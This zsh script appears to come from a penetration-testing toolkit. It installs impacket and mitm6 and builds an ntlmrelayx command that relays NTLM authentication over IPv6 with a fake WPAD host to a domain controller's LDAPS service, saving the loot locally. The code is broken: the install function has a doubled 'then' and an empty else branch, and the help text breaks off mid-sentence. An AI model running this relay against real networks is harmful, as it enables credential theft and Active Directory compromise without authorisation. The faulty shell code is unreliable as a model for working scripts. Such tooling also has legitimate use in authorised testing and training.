#!/usr/bin/env zsh

############################################################# 
# nb-ad-ipv6
#############################################################
nb-ad-ipv6-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-ipv6
------------
The nb-ad-ipv6 namespace contains commands for 

Commands
--------
nb-ad-ipv6-install         installs dependencies
nb-ad-ntlmrelayx           set up ntlm relay

DOC
}

nb-ad-ipv6-install() {
    __info "Running $0..."
    __pkgs impacket

    __info "Choose option 'I' to install mitm6 from github"
    if [ -f "/opt/pipmykali/" ]; then
    then
        pushd /opt/pipmykali/ &> /dev/null
        sudo ./pipmykali.sh
        popd &> /dev/null
      else
        #nb-install-pipmykali
    fi
}

nb-ad-ntlmrelayx() {
    __check-project
	  __check-domain
	  __ask "Enter the IP address of the target DC server"
	  nb-vars-set-rhost


    __ask "Enter a user account"
    nb-vars-set-user
    __ask "Enter a password for authentication"
    nb-vars-set-pass

    print -z "ntlmrelayx.py -6 -t ldaps://${__RHOST} -wh fakewpad.${__DOMAIN} -l lootme"
}
